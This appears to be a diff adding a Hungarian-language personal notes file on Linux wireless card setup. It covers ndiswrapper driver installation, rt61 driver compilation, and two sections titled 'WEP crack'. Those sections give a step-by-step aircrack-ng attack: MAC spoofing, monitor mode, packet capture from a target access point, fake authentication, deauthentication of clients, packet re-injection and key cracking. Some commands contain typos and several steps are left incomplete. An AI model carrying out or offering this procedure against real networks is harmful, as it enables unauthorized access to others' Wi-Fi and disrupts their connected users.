@@ -1,0 +1,322 @@
+	_______________________________________
+	Windows dirver installálása-ndiswrapper
+	_______________________________________
+
+	Ha nincs az adott kártyához linuxos driver, akkor használható a windowsos is az ndiswrapper segitségével:
+
+1.	A helyes mûködéshez le kell tölteni a windows saját driver-ét. zd1211rw chisset esetén: ki kell szedni 
+	a ZD1211BU.INF fájlt és elhelyezni mondjuk a:
+	
+	/usr/install/ndiswrapper 
+	
+	könyvtárban.
+	
+2.	#ndiswrapper -i ./ZD1211BU.INF
+
+
+3.	A muködés helyességének ellenörzésére adjuk ki a következõ parancsot:
+	
+	#ndiswrapper -l
+
+	Installed drivers:
+	zd1211bu driver installed, hardware present
+
+4.	ndiswrapper uninstallálása -át kell nézni, csak kimásoltam!!!
+
+	aptitude purge ndiswrapper
+	rm /etc/modprobe.d/ndiswrapper
+	sh -c "sed '/^ndiswrapper$/d' /etc/modules > /etc/modules.temp.rm; mv /etc/modules.temp.rm /etc/modules"
+	rmmod ndiswrapper
+	/lib/modules/`uname -r`/kernel/ubuntu/misc/ndiswrapper/ndiswrapper.ko
+	rm -rf /etc/ndiswrapper
+	rm /usr/sbin/ndiswrapper
+	rm /sbin/loadndisdriver
+	rm /lib/modules/`uname -r`/misc/ndiswrapper.ko
+
+
+
+	___________________________
+	WEP crarck I.
+	____________________________
+	vevõ:		GNWP01GS
+	chipset:	RT61
+	driver:		rt61
+	____________________________
+	Forrás: http://www.aircrack-ng.org/doku.php?id=rt61
+
+0.	A következõ elnevezéseket használom:
+	00:0F:D0:05:38:C8	-Az aircrack-ng-t futtató gép MAC címe
+	00:1B:FC:D2:15:B3	-BSSID: Hozzáférési pont MAC címe
+	tedy			-EESID: Vezetéknélküli hálózat neve
+	9			-Hozzáférési pont csatorna száma
+	ra0			-
+
+1.	Ellenõrizzük, hogy a rendszer megtalálta-e a pci kártyát:
+
+	#lspci
+	
+	0000:01:00.0 Network contoller: RaLink RT2561/RT61 rev B 802.11
+	
+2.	Megnézni, hogy milyen hálózati kártyát használunk
+
+	#airmon-ng
+	
+	Kiirja az   interfészt	chipset-et 	drivert
+		    ra0		Ralink 2561 PCI	rt61
+	
+3.	Driver letöltése
+	
+	#wget http://rt2x00.serialmonkey.com/rt61-cvs-daily.tar.gz
+	#tar xvfz rt61-cvs-daily.tar.gz
+	#cd rt61-cvs-*
+	#cd Module
+	#make
+	#make install
+	#rmmod rt61pci 2>/dev/null
+	#modprobe rt61
+
+
+4.	Kivesszük monitor módból a kártyát
+
+	#airmon-ng stop ra0
+	
+	Kiírja hogy a monitor mod nem engedélyezett.
+	
+5.	Leállítjuk az interfészt
+
+	#ifconfig ra0 down
+	
+6.	Megváltoztatjuk a MAC szamát az interfésznek
+
+	#macchanger --mac 00:11:22:33:44:55 ra0
+	
+7.	Monitor mod bekapcsolása
+
+	#airmon-ng start ra0
+	
+8.	Hálózat keresés
+
+	#airodump-ng ra0
+	
+	Leolvasható a megtalált hálózat ESSID-je, BSSID-je, a kódolásnak (aminek WEP-nek kell lenni), a csatorna és a Data.
+	Ezután Ctrl-C -vel leállítjuk a futást.
+
+9.	
+	
+	#airdump-ng -c 1 -w output -bssid 00:1B:FC:D2:15:B3 ra0
+	
+	-c	csatorna sz'ma
+	-w	a fájl ahova majd a kapott adatokat loggolja
+	-bssid	a megtalált hálózat MAC száma
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	_________________________
+	WEP crack II.
+	_________________________
+	
+-1	Nézzük meg, hogy mûködik-e az Injection.
+
+	#aireplay-ng -9 ra0
+	
+	Ha nem az a válasz, hogy "injection is working" akkor gáz van, közelebb kell menni
+	
+0.	Saját MAC megállapítása
+
+	#macchanger -s ra0
+i	
+1.	Monitormodba kapcsolás
+
+	#airmon-ng stop ra0
+	#airmon-ng start ra0
+
+	#iwconfig
+	ellenõrizzük a módot, aminek Monitor-nak kell lenni
+	leolvassuk a mi MAC szamunkat
+
+2.	Létezõ hálózatok keresése és kiválasztása
+
+	#airodump-ng ra0
+
+	Ha van találat, akkor leállítható, és eredményei a késõbbiekben felhasználandók
+		
+3.	Csomag elkapás és fájlba írása-autentikációs handshake gyüjtés
+
+	#airodump-ng -c 1 --bssid 00:1B:FC:D2:15:B3 -w output ra0
+
+	Futtassuk külön terminálban
+	
+4.	Osszekapcsoljuk a kártyánkat a hozzáférési ponttal
+
+	#aireplay-ng -1 0 -e teddy -a 00:1B:FC:D2:15:B3 -h 00:0F:D0:05:38:C8 ra0
+
+	jo eredmény ha egy mosolygojel az utolsó karakter az üzenetben. Ugras az 5.a.
+	
+	egyébként ugrás az 5.b. -re
+	
+5.a.	Csomag Re-Injection
+
+	#aireplay-ng -3 -b 00:1B:FC:D2:15:B3 -h 00:0F:D0:05:38:C8 ra0
+	
+	kb 5 perc amig lefut. ugrás 7.
+	
+5.b	Deautentikáció
+
+	#aireplay-ng -0 5 -a 00:1B:FC:D2:15:B3 -c 00:0F:D0:05:38:C8 ra0
+	
+6.b	Csomag Re-Injection
+
+	aireplay-ng -3 -b 00:1B:FC:D2:15:B3 -h 00:0F:D0:05:38:C8 ra0
+
+	kb 5 perc
+	
+7.	Dekripció
+
+	#aircrack-ng output.cap
+	
+	
+	
+	
+
+
+
+
+
+
+
+	____________________________
+	vevõ:		GNWP01GS
+	chipset:	RT61
+	driver:		rt61
+	____________________________
+	Forras:		www.cyberciti.biz/tips/linux-install-and-configure-dlink-dwl-g-520-wireless-lan-pci-card.html
+	
+1.	Ellenõrizzük, hogy a rendszer megtalálta-e a pci kártyát:
+
+	#lspci
+	
+	0000:01:00.0 Network contoller: RaLink RT2561/RT61 rev B 802.11
+	
+2.	Az aktuális pci.ids fájl letöltése és installálása. /usr/local/src könyvtárba
+
+	#update-pciids
+	
+3.	Driver letöltése
+	Rákeresni: rt61 linux driver download
+	
+4.	Driver kibontása és másolása a /usr/install könyvtárba
+
+5.	Driver fordítás
+
+	#cd Module
+	#cp Makefile.6 Makefile
+	#make
+	
+	Ennek hiba nélkül le kell fordulnia
+	
+6.	firmware elhelyezése
+
+	#mkdir -p /etc/Wireless/RT61STA
+	#cp rt2561.bin /etc/Wireless/RT61STA/
+	#cp rt2561s.bin /etc/Wireless/RT61STA/
+	#cp rt2661.bin /etc/Wireless/RT61STA/
+	
+	#cp rt61sta.dat /etc/Wireless/RT61sta.dat
+	#dos2unix /etc/Wireless/RT61STA/rt61sta.dat
+
+7.	Driver másolása a kernel könyvtárba
+
+	#cp rt61.ko /lib/modules/$(uname -r)/kernel/drivers/net/wireless
+	
+8.	Más ethernet kártyák tiltása:
+
+	#ifconfig eth0 down
+	
+9.	Uj modul betöltése
+	
+	#modprobe rt61
+
+_________	
+10.	Ellenõrizni, hogy a kártya támogatja-e az injection-t
+
+	#aireplay-ng -9 ra0	
+		
+	ha üzenet érkezik, hogy az RFMON nem engedélyezett, akkor engedélyeztetni kell a monitor modot:
+	
+	#airmon-ng start ra0
+	
+11.	
+
+
+
+
+	____________________________
+	vevõ:		TL-WN322G 
+	chipset:	ZyDAS
+	driver:		zd1211rw
+	windows driver:	ZD1211BU.INF
+	____________________________
+
+1.	megnézzük, hogy be van-e fordítva a zd1211rw modul	
+
+	#lsmod grep |zd -> megnézhetjük, hogy be van-e fordítva.
+
+	zd1211rw 		39616 0
+	ieee80211softmac 	27232 1 zd1211rw
+	ieee80211 		30216 2 zd1211rw, iee80211softmac
+	usbcore		112960 4 zd1211rw, usblp, uhci_hcd
+
+
+2.	A driver a linux csomag része
+	
+	#lsusb
+
+	Bus 001 Device 002: ID 0ace:1215 ZyDAS
+	Bus 001 Device 001: ID 0000:0000
+
+3	Ha nincs benne az ifconfig és az iwconfig listában, akkor nem találta meg a drivert ezért 
+	windowsos drivert kell telepiteni az ndiswrapper segitségével.
+	
+4.	/lib/modules/version/modules.dep elkészítése
+
+	#depmod -a
+	
+5.	ndiswrapper modul elhelyezése a	kernelben:
+		
+	#modprobe ndiswrapper
+	
+6.	Ellenõrizzük, hogy nem történt-e hiba:
+    
+	#dmesg
+	
+	ndiswrapper version 1.21 loaded (preempt=no, smp=yes)
+
+7.	#modprobe -m
+
+8.	Adjuk meg, hogy minden rendszer indulásakor a modul betöltõdjön:
+
+	echo "ndiswrapper" | tee -a /etc/modules
+	
+9.	#lshw
+
+    
+10.	Ellenõrizzük a hálózati konfigurációt:
+
+	#ifconfig
+
+	#iwconfig    
+
+
+	
